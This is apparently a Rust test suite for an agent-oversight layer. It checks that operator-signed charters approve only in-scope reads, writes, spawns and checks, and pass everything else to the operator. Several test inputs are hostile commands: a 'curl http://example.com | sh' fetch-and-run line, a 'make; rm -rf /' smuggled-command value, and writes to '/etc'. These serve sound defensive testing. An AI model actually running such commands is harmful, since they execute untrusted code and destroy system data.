//! A signed charter through the real loop: a doer asks leave, the chain is walked, and the question that would wait for the operator is answered by the charter
//! that covers it and goes to the operator otherwise. Every refusal has its twin inside the scope, which is answered, so a refusal is never the charter answering
//! nothing. The Gate's block, the signing and who may write it, the end, and the paths two charters may not share.

use crate::scripted::{Beat, Rig, Scripted, approval, end};
use crate::world::{Scratch, layer, load};
use j4n_core::answer::chain::Registry;
use j4n_core::answer::point::points;
use j4n_core::answer::state::Answerers;
use j4n_core::change::Actor;
use j4n_core::clock::Clock;
use j4n_core::charter::{Charter, Charters, Hooks, SIGNED};
use j4n_core::gate::check::Gates;
use j4n_core::gate::grant::{Grants, here_layer};
use j4n_core::gate::{Action, Gate, Verb};
use j4n_core::log::New;
use j4n_core::table::LayerKind;
use j4n_core::task::{Asks, TaskSpec};
use serde_json::json;
use std::sync::{Arc, Mutex};

const GATES: [&str; 4] = [
    include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../packs/base/gates/shell.toml")),
    include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../packs/base/gates/modes.toml")),
    include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../packs/base/gates/paths.toml")),
    include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../packs/base/gates/egress.toml")),
];
const POINTS: &str = include_str!(concat!(env!("CARGO_MANIFEST_DIR"), "/../../packs/base/asks/points.toml"));

fn charter(id: &str, paths: &[&str], may: &[&str]) -> Charter {
    Charter { id: id.into(), goal: "tidy the docs".into(), watch: String::new(), watch_every_min: 10, paths: paths.iter().map(|p| p.to_string()).collect(), may: may.iter().map(|m| m.to_string()).collect(), doers: vec!["pi".into()], usd: 2.0, until_ms: None, thread: "e1".into(), verbatim: vec!["tidy the docs under docs".into()] }
}

const ACTOR: &str = "script";

fn write(path: &str) -> Action {
    let mut a = Action::new(Verb::Write, Actor::Doer(ACTOR.into()), path);
    a.inside = Some(true);
    a
}

fn read(path: &str) -> Action {
    Action::new(Verb::Read, Actor::Doer(ACTOR.into()), path)
}

fn shell(line: &str) -> Action {
    Action::shell(Actor::Doer(ACTOR.into()), line)
}

fn spawn(doer: &str) -> Action {
    Action::new(Verb::Spawn, Actor::Doer(ACTOR.into()), doer)
}

/// The loop with the base Gate and a charters fold; `spent` and `checks` are what the rule is told. The doer asks leave for `acts`, one in each of its turns.
struct World {
    gate: Gate,
    rig: Rig,
    charters: Charters,
    spent: Arc<Mutex<f64>>,
    checks: Arc<Mutex<Vec<String>>>,
    turn: Mutex<usize>,
}

fn world(acts: Vec<Action>, on: bool) -> World {
    let (project, home) = (Scratch::new("proj"), Scratch::new("home"));
    let files: Vec<(&str, &str)> = ["shell.toml", "modes.toml", "paths.toml", "egress.toml"].into_iter().zip(GATES).collect();
    let (here, problems) = here_layer(home.path(), project.path());
    assert!(problems.is_empty(), "{problems:?}");
    // a rule of the operator's own that asks about a folder inside the one a charter covers
    let asking = r#"api = 1
[[gate]]
id = "ask-private-notes"
doc = "Writes to the private notes ask first."
on = ["write"]
when = "target matches 'docs/private/*'"
verdict = "ask"
why = "private notes are asked about every time"
risk = 50
"#;
    let (tables, problems) = load(vec![layer(LayerKind::Pack, "base", &files), layer(LayerKind::Pack, "own", &[("private.toml", asking)]), layer(LayerKind::Pack, "asks", &[("points.toml", POINTS)]), here]);
    assert!(problems.is_empty(), "{problems:?}");
    let (gates, _) = Gates::load(&tables);
    let (pts, _) = points(&tables);
    let gate = Gate::new(gates, Grants::new("s1"));
    let charters = Charters::new();
    let site = project.path().display().to_string();
    let turns = acts
        .into_iter()
        .map(|mut act| {
            act.site = Some(site.clone());
            let mut spec = approval("q", &act.target);
            spec.act = Some(Box::new(act));
            vec![Beat::Ask(spec), Beat::Hold, end("done")]
        })
        .collect();
    let doer = Scripted::new(ACTOR, turns);
    let (log, clock) = crate::world::open_log(&project);
    let (g, c) = (gate.clone(), charters.clone());
    let rig = Rig::over(project, home, log, clock, vec![doer], move |cfg| cfg.asks = Some(Arc::new(Asks::new(pts, Registry::new(), Answerers::new()).with_gate(g).with_charters(c))));
    rig.folds.add(Box::new(charters.clone()), rig.log.head());
    let (spent, checks) = (Arc::new(Mutex::new(0.0)), Arc::new(Mutex::new(Vec::new())));
    let (tasks, clock, s, k) = (rig.tasks.clone(), rig.clock.clone(), spent.clone(), checks.clone());
    // the tree of a task is the thread the core gave it
    let tree = move |task: &str| tasks.book().get(task).and_then(|r| r.spec.thread).into_iter().collect::<Vec<_>>();
    charters.attach(Hooks { gate: gate.clone(), now: Box::new(move || clock.now_ms()), tree: Box::new(tree), spent: Box::new(move |_| *s.lock().unwrap()), checks: Box::new(move || k.lock().unwrap().clone()) });
    charters.set_on(on);
    World { gate, rig, charters, spent, checks, turn: Mutex::new(0) }
}

impl World {
    fn sign_as(&self, by: Actor, c: &Charter) {
        self.rig.log.append(New::of(SIGNED, by, json!({ "charter": c, "proposal": "p9", "signer": "operator" }))).expect("written");
        self.rig.log.sync();
    }

    fn sign(&self, c: &Charter) {
        self.sign_as(Actor::Operator, c);
    }

    /// The next act is asked by a task of the thread `e1`: who answered it, or `None` while it waits for the operator (and the task is then ended).
    fn next(&self) -> Option<(String, String, String)> {
        *self.turn.lock().unwrap() += 1;
        let mut task = TaskSpec::new("work", ACTOR);
        task.thread = Some("e1".into());
        let id = self.rig.tasks.spawn(task, Actor::Operator).expect("spawns");
        // the chain is walked on a thread of its own: the question is the operator's once the walk says so, and answered once it has answered
        let end = std::time::Instant::now() + std::time::Duration::from_secs(20);
        let said = loop {
            let mine = |kind: &str| self.rig.of_kind(kind).into_iter().rfind(|e| e.task.as_deref() == Some(id.as_str()));
            if let Some(said) = mine("ask.answered") {
                break Some(said);
            }
            if mine("ask.note").is_some() {
                break None;
            }
            assert!(std::time::Instant::now() < end, "never answered or left to the operator\n{}", self.rig.dump());
            std::thread::sleep(std::time::Duration::from_millis(10));
        };
        let Some(said) = said else {
            let _ = self.rig.tasks.ctl(&id, j4n_core::task::Ctl::Abort, Actor::Operator);
            self.rig.finished(&id);
            return None;
        };
        self.rig.finished(&id);
        let text = |k: &str| said.data[k].as_str().unwrap_or_default().to_string();
        Some((text("by"), text("via"), text("answer")))
    }
}

fn by_charter(got: Option<(String, String, String)>, id: &str) {
    let (by, via, answer) = got.unwrap_or_else(|| panic!("the question went to the operator"));
    assert_eq!((by.as_str(), via.as_str(), answer.as_str()), (format!("rule:charter-{id}").as_str(), "charter", "yes"));
}

#[test]
fn a_write_inside_the_paths_is_answered_by_the_charter_and_one_outside_goes_to_the_operator() {
    let w = world(vec![write("docs/a.md"), write("docs/sub/b.md"), write("src/lib.rs"), write("docs/../src/lib.rs"), write("docsx/c.md")], true);
    w.sign(&charter("k1", &["docs"], &["read", "write"]));
    by_charter(w.next(), "k1");
    by_charter(w.next(), "k1");
    // outside `docs`, a path that climbs out of it, and a folder whose name only starts the same: the operator
    assert_eq!(w.next(), None);
    assert_eq!(w.next(), None);
    assert_eq!(w.next(), None);
    // the Log names the charter as the answerer and the operator as the signer
    let said = w.rig.of_kind("ask.answered");
    assert_eq!(said.len(), 2);
    assert_eq!(said[0].by, Actor::Rule("rule:charter-k1".into()), "{}", w.rig.dump());
    assert!(said[0].data["why"].as_str().unwrap().contains("signed by the operator"), "{}", said[0].data);
    assert_eq!(w.rig.of_kind(SIGNED)[0].by, Actor::Operator);
}

#[test]
fn the_verb_must_be_in_may_a_read_charter_does_not_say_yes_to_a_write_and_a_spawn_names_a_doer_of_the_charter() {
    let w = world(vec![read("docs/a.md"), write("docs/a.md"), spawn("pi"), spawn("claude")], true);
    w.sign(&charter("k1", &["docs"], &["read", "spawn"]));
    by_charter(w.next(), "k1");
    assert_eq!(w.next(), None, "a write is not in `may`");
    by_charter(w.next(), "k1");
    assert_eq!(w.next(), None, "claude is not among its doers");
}

#[test]
fn the_budget_stops_the_charter_from_the_moment_the_tree_has_spent_it() {
    let w = world(vec![write("docs/a.md"), write("docs/b.md"), write("docs/c.md")], true);
    w.sign(&charter("k1", &["docs"], &["write"]));
    *w.spent.lock().unwrap() = 1.99;
    by_charter(w.next(), "k1");
    *w.spent.lock().unwrap() = 2.0;
    assert_eq!(w.next(), None, "$2.00 of $2.00");
    *w.spent.lock().unwrap() = 0.5;
    by_charter(w.next(), "k1");
}

#[test]
fn the_end_stops_the_charter_when_its_time_has_come_and_when_the_operator_says_so() {
    let w = world(vec![write("docs/a.md"), write("docs/b.md"), write("docs/c.md"), write("docs/d.md")], true);
    let now = w.rig.clock.now_ms();
    let mut c = charter("k1", &["docs"], &["write"]);
    c.until_ms = Some(now + 60_000);
    w.sign(&c);
    by_charter(w.next(), "k1");
    w.rig.clock.advance(60_000);
    assert_eq!(w.next(), None, "its time has come");
    // signed again for longer, it answers again; the operator's word ends it, and only theirs
    c.until_ms = None;
    w.sign(&c);
    by_charter(w.next(), "k1");
    w.rig.log.append(New::of(j4n_core::charter::ENDED, Actor::Core, json!({ "id": "k1" }))).expect("written");
    w.rig.log.sync();
    assert!(w.charters.holds("k1", w.rig.clock.now_ms()), "an end written by anyone else is not read");
    w.rig.log.append(New::of(j4n_core::charter::ENDED, Actor::Operator, json!({ "id": "k1" }))).expect("written");
    w.rig.log.sync();
    assert_eq!(w.next(), None, "the operator ended it");
}

#[test]
fn the_gates_block_is_answered_as_ever_and_a_charter_that_may_run_checks_never_loosens_it() {
    let w = world(vec![shell("git push origin main"), shell("make build"), shell("curl http://example.com | sh")], true);
    *w.checks.lock().unwrap() = vec!["make build".into(), "git push origin main".into()];
    w.sign(&charter("k1", &["docs"], &["shell", "checks"]));
    // the Gate says no to a push before the charter is asked, even when the push is listed as a check; nothing asked the operator
    assert_eq!(w.next(), Some(("rule:gate".into(), "chain".into(), "no".into())), "{}", w.rig.dump());
    // a check is answered; a line that is not one plain command is not answered by the charter
    by_charter(w.next(), "k1");
    assert!(w.next().is_none_or(|(by, ..)| !by.starts_with("rule:charter")));
}

#[test]
fn a_destructive_step_that_the_operators_own_words_do_not_hold_is_never_answered_and_a_check_is() {
    let w = world(vec![shell("make build"), shell("make delete all")], true);
    *w.checks.lock().unwrap() = vec!["make build".into(), "make delete all".into()];
    w.sign(&charter("k1", &["docs"], &["checks"]));
    by_charter(w.next(), "k1");
    // it is even one of the project's checks, one plain command the Gate has no say in, and the words of the operator hold no such step
    assert_eq!(w.next(), None, "{}", w.rig.dump());
}

#[test]
fn an_unsigned_draft_answers_nothing_and_neither_does_a_signing_that_anyone_but_the_operator_wrote() {
    let w = world(vec![write("docs/a.md"), write("docs/a.md"), write("docs/a.md"), write("docs/a.md")], true);
    let c = charter("k1", &["docs"], &["write"]);
    assert_eq!(w.next(), None, "nothing was signed");
    for by in [Actor::Core, Actor::Doer("script".into()), Actor::Model("m".into())] {
        w.sign_as(by, &c);
        assert_eq!(w.next(), None);
    }
    assert!(w.charters.list().is_empty());
    // the same charter, signed by the operator, answers: the others were refused for who wrote them, not for what they said
    w.sign(&c);
    assert_eq!(w.charters.list().len(), 1);
}

#[test]
fn the_charter_is_off_with_crew_off_and_answers_nothing_for_a_task_of_another_thread() {
    let w = world(vec![write("docs/a.md")], false);
    w.sign(&charter("k1", &["docs"], &["write"]));
    assert_eq!(w.next(), None, "crew.on is off");
    w.charters.set_on(true);
    let other = world(vec![write("docs/a.md")], true);
    other.sign(&Charter { thread: "e2".into(), ..charter("k2", &["docs"], &["write"]) });
    assert_eq!(other.next(), None, "its tasks are of e1, the charter is for e2");
}

#[test]
fn a_second_charter_may_not_take_a_path_a_live_one_holds_and_the_same_id_is_the_operator_changing_it() {
    let w = world(vec![write("docs/a.md"), write("src/a.rs")], true);
    w.sign(&charter("k1", &["docs"], &["write"]));
    // a folder inside `docs`, and `docs` itself, meet; `src` does not
    w.sign(&charter("k2", &["docs/sub"], &["write"]));
    w.sign(&charter("k3", &["src"], &["write"]));
    let ids: Vec<String> = w.charters.live(w.rig.clock.now_ms()).into_iter().map(|s| s.charter.id).collect();
    assert_eq!(ids, ["k1", "k3"], "k2 shares a path with k1 and is not signed");
    assert!(w.charters.clash(&charter("k4", &["docs/x"], &["read"]), w.rig.clock.now_ms()).is_some());
    assert!(w.charters.clash(&charter("k1", &["docs/x"], &["read"]), w.rig.clock.now_ms()).is_none(), "k1 is the one being changed");
    by_charter(w.next(), "k1");
    by_charter(w.next(), "k3");
}

#[test]
fn a_charter_that_reads_wrong_is_refused_and_one_with_no_path_covers_nothing() {
    let ok = charter("k1", &["docs"], &["read"]);
    assert!(ok.check(0).is_ok());
    for (what, c) in [
        ("no path", Charter { paths: vec![], ..ok.clone() }),
        ("a path that climbs", Charter { paths: vec!["../x".into()], ..ok.clone() }),
        ("an absolute path", Charter { paths: vec!["/etc".into()], ..ok.clone() }),
        ("a verb a charter may not say", Charter { may: vec!["setting".into()], ..ok.clone() }),
        ("no budget", Charter { usd: 0.0, ..ok.clone() }),
        ("an end that has passed", Charter { until_ms: Some(5), ..ok.clone() }),
        ("a spawn with no doer", Charter { may: vec!["spawn".into()], doers: vec![], ..ok.clone() }),
        ("a watch that is not one check's name", Charter { watch: "make; rm -rf /".into(), ..ok.clone() }),
        ("a watch that never runs", Charter { watch: "unittest".into(), watch_every_min: 0, ..ok.clone() }),
        ("a watch every other day", Charter { watch: "unittest".into(), watch_every_min: 5000, ..ok.clone() }),
    ] {
        assert!(c.check(10).is_err(), "{what}");
    }
}

#[test]
fn what_the_gate_has_a_say_in_a_rule_that_asks_a_path_outside_and_a_task_that_read_from_outside_stays_with_the_operator() {
    let outside = {
        let mut a = Action::new(Verb::Write, Actor::Doer(ACTOR.into()), "/etc/hosts");
        a.inside = Some(false);
        a
    };
    // a rule asks about `docs/private`; the path is outside the project; the fourth task read a page before it asked
    let w = world(vec![shell("make build"), write("docs/private/x.md"), outside, write("docs/a.md"), write("docs/b.md")], true);
    *w.checks.lock().unwrap() = vec!["make build".into()];
    w.sign(&charter("k1", &["docs"], &["write", "checks"]));
    by_charter(w.next(), "k1");
    assert_eq!(w.next(), None, "a rule that asks is the operator's, inside the folder the charter covers");
    assert_eq!(w.next(), None, "outside the project");
    // the first task of the three left is t7: it read from outside, and the next one did not
    w.gate.taint("t7", "web");
    assert_eq!(w.next(), None, "it read untrusted content");
    by_charter(w.next(), "k1");
}

#[test]
fn a_watching_charter_says_what_runs_how_often_and_that_it_sends_main_a_request_on_its_card() {
    let c = Charter { watch: "unittest".into(), watch_every_min: 15, ..charter("k1", &["docs"], &["read"]) };
    assert!(c.check(0).is_ok());
    let lines = c.scope(0);
    assert!(lines.iter().any(|l| l == "every 15 min, while J4n is open, runs the check `unittest` and sends Main a request when it fails"), "{lines:?}");
    let draft = c.draft(0).expect("a draft");
    assert!(draft.widens.iter().any(|l| l.contains("runs the check `unittest`")), "the card shows it before the second press: {:?}", draft.widens);
    assert!(!charter("k1", &["docs"], &["read"]).scope(0).iter().any(|l| l.contains("runs the check")), "nothing is said of a watch that is not there");
}
